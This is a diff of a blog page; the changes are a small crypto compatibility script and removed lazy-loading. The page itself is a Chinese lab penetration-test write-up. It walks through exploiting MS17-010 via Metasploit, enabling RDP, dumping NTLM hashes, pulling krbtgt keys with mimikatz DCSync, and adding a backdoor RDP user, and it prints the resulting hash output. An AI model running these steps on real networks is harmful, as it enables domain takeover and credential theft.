@@ -9,7 +9,22 @@
     }
     </style>
 
-  
+  <script>
+    // 强制内网 IP 识别为安全上下文
+    if (window.location.hostname !== 'localhost' && window.location.protocol === 'http:') {
+        // 尝试手动映射 crypto 属性
+        if (!window.crypto.subtle && window.crypto.webkitSubtle) {
+            window.crypto.subtle = window.crypto.webkitSubtle;
+        }
+    }
+    
+    // 终极补丁：如果还是没有 subtle，则创建一个占位符避免报错
+    // 提示：这通常能解决加载报错，但如果插件强依赖原生加密，建议执行下面的“降级”预判
+    if (!window.isSecureContext) {
+        console.warn('当前环境非安全上下文，正在尝试兼容内网加密解密...');
+    }
+</script>
+
 
 <head>
   <meta charset="UTF-8">
@@ -61,7 +76,7 @@
 
   <script id="fluid-configs">
     var Fluid = window.Fluid || {};
-    var CONFIG = {"hostname":"192.168.126.129","root":"/","version":"1.8.7","typing":{"enable":false,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"onlypost":false},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}}};
+    var CONFIG = {"hostname":"192.168.126.129","root":"/","version":"1.8.7","typing":{"enable":false,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":false,"onlypost":false},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}}};
   </script>
   <script  src="/js/utils.js" ></script>
   <script  src="/js/color-schema.js" ></script>
@@ -230,11 +245,11 @@
             <div class="markdown-body">
               <p><strong>10.100.10.0&#x2F;24</strong></p>
 <h2 id="发现目标"><a href="#发现目标" class="headerlink" title="发现目标"></a>发现目标</h2><p>fscan.exe -h 10.100.10.0&#x2F;24</p>
-<p><img src="/2022/05/01/31689/image-20220501152725967.png" srcset="/img/loading.gif" alt="image-20220501152725967"></p>
+<p><img src="/2022/05/01/31689/image-20220501152725967.png" alt="image-20220501152725967"></p>
 <p>发现ms17-010</p>
-<p><img src="/2022/05/01/31689/2.png" srcset="/img/loading.gif"></p>
+<p><img src="/2022/05/01/31689/2.png"></p>
 <h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>用windows&#x2F;smb&#x2F;ms17_010_psexec模块</p>
-<p><img src="/2022/05/01/31689/3.png" srcset="/img/loading.gif"></p>
+<p><img src="/2022/05/01/31689/3.png"></p>
 <p>获取到10.100.10.254的system权限</p>
 <p>Microsoft Windows Server 2012 R2 Standard</p>
 <p><a target="_blank" rel="noopener" href="https://whale3070.github.io/2020/02/13/08-x/#%E5%85%B3%E9%97%AD">关闭防火墙</a></p>
@@ -242,26 +257,26 @@
 <figure class="highlight dockerfile"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs dockerfile">管理员权限命令开启<span class="hljs-number">3389</span>远程登陆<br>REG <span class="hljs-keyword">ADD</span><span class="language-bash"> HKLM\SYSTEM\CurrentControlSet\Control\Terminal<span class="hljs-string">&quot; &quot;</span>Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f</span><br></code></pre></div></td></tr></table></figure>
 
 <h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><p>sysinfo发现payload是x86，系统是x64</p>
-<p><img src="/2022/05/01/31689/4.png" srcset="/img/loading.gif"></p>
+<p><img src="/2022/05/01/31689/4.png"></p>
 <p>set payload &#x2F;windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp</p>
 <p>run</p>
 <p>重新运行payload，获得一个一致的都是x64的payload</p>
 <p>load kiwi 这次就不会报错了</p>
-<h3 id="hashdump"><a href="#hashdump" class="headerlink" title="hashdump"></a>hashdump</h3><p><img src="/2022/05/01/31689/5.png" srcset="/img/loading.gif"></p>
+<h3 id="hashdump"><a href="#hashdump" class="headerlink" title="hashdump"></a>hashdump</h3><p><img src="/2022/05/01/31689/5.png"></p>
 <figure class="highlight elixir"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs elixir"><span class="hljs-symbol">Administrator:</span><span class="hljs-number">500</span><span class="hljs-symbol">:aad3b435b51404eeaad3b435b51404ee</span><span class="hljs-symbol">:</span><span class="hljs-number">42</span>fa68a64510c74b514cf70f46728718:::<br><span class="hljs-symbol">Guest:</span><span class="hljs-number">501</span><span class="hljs-symbol">:aad3b435b51404eeaad3b435b51404ee</span><span class="hljs-symbol">:</span><span class="hljs-number">31</span>d6cfe0d16ae931b73c59d7e0c089c0:::<br><span class="hljs-symbol">krbtgt:</span><span class="hljs-number">502</span><span class="hljs-symbol">:aad3b435b51404eeaad3b435b51404ee</span><span class="hljs-symbol">:f4f88438c968756e75252ca4056b0607</span>:::<br><span class="hljs-symbol">employee1:</span><span class="hljs-number">1104</span><span class="hljs-symbol">:aad3b435b51404eeaad3b435b51404ee</span><span class="hljs-symbol">:</span><span class="hljs-number">89551</span>acff8895768e489bb3054af94fd:::<br><span class="hljs-symbol">employee2:</span><span class="hljs-number">1604</span><span class="hljs-symbol">:aad3b435b51404eeaad3b435b51404ee</span><span class="hljs-symbol">:</span><span class="hljs-number">89551</span>acff8895768e489bb3054af94fd:::<br><span class="hljs-title class_">LAB</span>-<span class="hljs-title class_">DC01</span><span class="hljs-variable">$:</span><span class="hljs-number">1001</span><span class="hljs-symbol">:aad3b435b51404eeaad3b435b51404ee</span><span class="hljs-symbol">:</span><span class="hljs-number">2159</span>dc0dfefa42e24c36c5ed00dc194d:::<br><span class="hljs-title class_">ELS</span>-<span class="hljs-title class_">DB</span><span class="hljs-variable">$:</span><span class="hljs-number">2102</span><span class="hljs-symbol">:aad3b435b51404eeaad3b435b51404ee</span><span class="hljs-symbol">:ce8c2f6528b04f6f7719f17f7b415110</span>::<span class="hljs-symbol">:</span><br></code></pre></div></td></tr></table></figure>
 
 <h3 id="krbtgt用户的ntml-hash"><a href="#krbtgt用户的ntml-hash" class="headerlink" title="krbtgt用户的ntml hash"></a>krbtgt用户的ntml hash</h3><p>systeminfo获取域名是els.local</p>
 <p>kiwi_cmd  “lsadump::dcsync &#x2F;domain:ELS.local &#x2F;user:krbtgt” exit</p>
-<p><img src="/2022/05/01/31689/6.png" srcset="/img/loading.gif"></p>
+<p><img src="/2022/05/01/31689/6.png"></p>
 <figure class="highlight tap"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs tap">Object RDN           : krbtgt<br><br>** SAM ACCOUNT **<br><br>SAM Username         : krbtgt<br>Account Type         :<span class="hljs-number"> 30000000 </span>( USER_OBJECT )<br>User Account Control :<span class="hljs-number"> 00000202 </span>( ACCOUNTDISABLE NORMAL_ACCOUNT )<br>Account expiration   : <br>Password last change : 9/7/2017 1:06:33 PM<br>Object Security ID   : S-1-5-21-2128511948-1856962338-1523442862-502<br>Object Relative ID   : 502<br><br>Credentials:<br>  Hash NTLM: f4f88438c968756e75252ca4056b0607<br>    ntlm- 0: f4f88438c968756e75252ca4056b0607<br>    lm  - 0: 796bb740273c0b52aad3fc877569d154<br><br>Supplemental Credentials:<br>* Primary:Kerberos-Newer-Keys *<br>    Default Salt : ELS.LOCALkrbtgt<br>    Default Iterations : 4096<br>    Credentials<br>      aes256_hmac       (4096) : ea1eed08c1415830586da480e47128f784c3ab802dabdc719e915574cd7c02b8<br>      aes128_hmac       (4096) : f2e09fa8532e490c20ad367274b63eff<br>      des_cbc_md5       (4096) : 57fb67328f4651a7<br><br>* Primary:Kerberos *<br>    Default Salt : ELS.LOCALkrbtgt<br>    Credentials<br>      des_cbc_md5       : 57fb67328f4651a7<br><br>* Packages *<br>    Kerberos-Newer-Keys<br><br>* Primary:WDigest *<br>   <span class="hljs-number"> 01 </span> b4e712be7d587a19fe5b18b07a7ff799<br>   <span class="hljs-number"> 02 </span> d661bfd605e045d9fe1d33e65c29851f<br>   <span class="hljs-number"> 03 </span> 18795d06c1899bca46790f8503ec5657<br>   <span class="hljs-number"> 04 </span> b4e712be7d587a19fe5b18b07a7ff799<br>   <span class="hljs-number"> 05 </span> d661bfd605e045d9fe1d33e65c29851f<br>   <span class="hljs-number"> 06 </span> e367adb4030134e0db20e3a8a89c939c<br>   <span class="hljs-number"> 07 </span> b4e712be7d587a19fe5b18b07a7ff799<br>   <span class="hljs-number"> 08 </span> c74107b81fe8ac69f361ef69fa07bd33<br>   <span class="hljs-number"> 09 </span> 62f22a6dded5b9cb144286b8aacf4e52<br>   <span class="hljs-number"> 10 </span> d793f1d9a272cfd0c9c1f85f4471ed6c<br>   <span class="hljs-number"> 11 </span> 9f0f26ccf257dd3cc7b5eb9653135c52<br>   <span class="hljs-number"> 12 </span> 62f22a6dded5b9cb144286b8aacf4e52<br>   <span class="hljs-number"> 13 </span> 7e2ef8467500ea897fe14d8c75a00371<br>   <span class="hljs-number"> 14 </span> 9f0f26ccf257dd3cc7b5eb9653135c52<br>   <span class="hljs-number"> 15 </span> 72ee0d58dacdc495f26eb41f265b1a56<br>   <span class="hljs-number"> 16 </span> 8a21f62f5738c7dc8e6dea429d5b14f3<br>   <span class="hljs-number"> 17 </span> dce1636f62f8243de2c1da4a550b2a0c<br>   <span class="hljs-number"> 18 </span> 5cd94f4ef88eb2e19d917b981521d936<br>   <span class="hljs-number"> 19 </span> 2afc7bf73595e809680d023370b9b579<br>   <span class="hljs-number"> 20 </span> 8b92462fc00ec762409b5b7d1a4131c7<br>   <span class="hljs-number"> 21 </span> f3ee8052899de9e3f046fb017bad8359<br>   <span class="hljs-number"> 22 </span> f3ee8052899de9e3f046fb017bad8359<br>   <span class="hljs-number"> 23 </span> 364c14e0d171941117fa604aa49f9ff2<br>   <span class="hljs-number"> 24 </span> 2172c5b30290454427c6fab627b0fb3f<br>   <span class="hljs-number"> 25 </span> c84ad6ecb2eab909070c8eec6398ab3f<br>   <span class="hljs-number"> 26 </span> f5bd755ff6a99ba925a12d83f41ea5a5<br>   <span class="hljs-number"> 27 </span> d55b4aa4ad0c89b8896ebf0043c5b94c<br>   <span class="hljs-number"> 28 </span> 49c53beb45333327deb0ef9a7aa4bbaa<br>   <span class="hljs-number"> 29 </span> e1ac403d7b274c3d8c2e2c2d40ab7ccc<br><br><br>mimikatz(powershell) <span class="hljs-comment"># exit</span><br>Bye!<br></code></pre></div></td></tr></table></figure>
 
 <h3 id="添加用户"><a href="#添加用户" class="headerlink" title="添加用户"></a>添加用户</h3><figure class="highlight crmsh"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs crmsh">net <span class="hljs-keyword">user</span> <span class="hljs-title">whale3070</span> xCTD)(Qa<span class="hljs-comment">#12 /add /expires:never</span><br></code></pre></div></td></tr></table></figure>
 
-<p><img src="/2022/05/01/31689/7.png" srcset="/img/loading.gif"></p>
+<p><img src="/2022/05/01/31689/7.png"></p>
 <p>net localgroup “Remote Desktop Users” whale3070 &#x2F;add</p>
 <p>添加远程用户登录权限</p>
-<p><img src="/2022/05/01/31689/8.png" srcset="/img/loading.gif"></p>
-<p><img src="/2022/05/01/31689/9.png" srcset="/img/loading.gif"></p>
+<p><img src="/2022/05/01/31689/8.png"></p>
+<p><img src="/2022/05/01/31689/9.png"></p>
 <p><a target="_blank" rel="noopener" href="https://whale3070.github.io/2020/05/02/04-x/">windows域-cmd用户管理命令 </a></p>
 <p>只有域控能查询域管理员。现在已经登录到域控机器了。</p>
 
@@ -398,10 +413,6 @@
 
 <!-- Plugins -->
 
-
-  
-    <script  src="/js/lazyload.js" ></script>
-  
 
 
 
